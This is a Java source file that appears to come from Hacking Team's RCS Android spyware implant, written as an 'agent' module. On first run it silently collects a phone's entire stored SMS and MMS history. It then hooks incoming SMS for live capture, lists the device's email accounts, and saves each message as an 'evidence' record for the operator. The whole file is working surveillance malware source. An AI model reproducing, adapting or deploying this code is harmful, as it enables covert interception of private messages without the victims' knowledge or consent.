/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.Mms;
import com.ht.RCSAndroidGUI.Sms;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.agent.sms.MmsBrowser;
import com.ht.RCSAndroidGUI.agent.sms.SmsBrowser;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.evidence.Markup;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.interfaces.SmsHandler;
import com.ht.RCSAndroidGUI.listener.ListenerSms;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

/**
 * The Class MessageAgent.
 * 
 * @author zeno -> Ahahah ti piacerebbe eh?? :>
 * @real-author Que, r0x
 */
public class AgentMessage extends AgentBase implements Observer<Sms> {
	/** The TAG. */
	private final String TAG = "AgentMessage";

	private static final int SMS_VERSION = 2010050501;
	private SmsHandler smsHandler;

	@Override
	public void begin() {
		ListenerSms.self().attach(this);

		Markup storedImsi = new Markup(AgentType.AGENT_SMS);

		// Abbiamo gia' catturato lo storico
		if (storedImsi.isMarkup() == false) {
			Log.d("QZ", TAG + " (begin): cattura sms di storico");

			SmsBrowser smsBrowser = new SmsBrowser();
			ArrayList<Sms> listSms = smsBrowser.getSmsList();
			Iterator<Sms> iterSms = listSms.listIterator();

			while (iterSms.hasNext()) {
				Sms s = iterSms.next();
				saveSms(s);
			}

			MmsBrowser mmsBrowser = new MmsBrowser();
			ArrayList<Mms> listMms = mmsBrowser.getMmsList();
			Iterator<Mms> iterMms = listMms.listIterator();

			while (iterMms.hasNext()) {
				Mms mms = iterMms.next();
				mms.print();
				saveMms(mms);
			}

			// Scriviamo il markup
			storedImsi.writeMarkup(Utils.longToByteArray(System.currentTimeMillis()));
		}

		// Iniziamo la cattura live
		SmsHandler smsHandler = new SmsHandler();
		smsHandler.start();
	}

	@Override
	public void end() {
		ListenerSms.self().detach(this);
		smsHandler.quit();
	}

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(NEVER);
		setDelay(100);

		return true;
	}

	@Override
	public void go() {

	}

	public int notification(Sms s) {
		// Live SMS
		saveSms(s);
		return 1;
	}

	// SNIPPET
	/**
	 * Check email accounts.
	 */
	private void checkEmailAccounts() {
		final Account[] accounts = AccountManager.get(Status.getAppContext()).getAccounts();

		for (final Account account : accounts) {

			final String name = account.name;
			Log.d("QZ", TAG + name);
		}
	}

	private void saveSms(Sms sms) {
		String address = sms.getAddress();
		byte[] body = WChar.getBytes(sms.getBody());
		long date = sms.getDate();
		boolean sent = sms.getSent();

		saveEvidence(address, body, date, sent);
	}

	private void saveMms(Mms mms) {
		String address = mms.getAddress();
		byte[] subject = WChar.getBytes("MMS Subject: " + mms.getSubject());
		long date = mms.getDate();
		DateTime filetime = new DateTime(date);
		boolean sent = mms.getSent();

		saveEvidence(address, subject, date, sent);
	}

	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
		DateTime filetime = new DateTime(new Date(date));

		String from, to;

		int flags;

		if (sent) {
			flags = 0;
			from = "local";
			to = address;
		} else {
			flags = 1;
			to = "local";
			from = address;
		}

		final int additionalDataLen = 48;
		final byte[] additionalData = new byte[additionalDataLen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
		databuffer.writeInt(SMS_VERSION);
		databuffer.writeInt(flags);
		databuffer.writeLong(filetime.getFiledate());
		databuffer.write(Utils.padByteArray(from.getBytes(), 16));
		databuffer.write(Utils.padByteArray(to.getBytes(), 16));

		new LogR(EvidenceType.SMS_NEW, additionalData, body);
	}
}
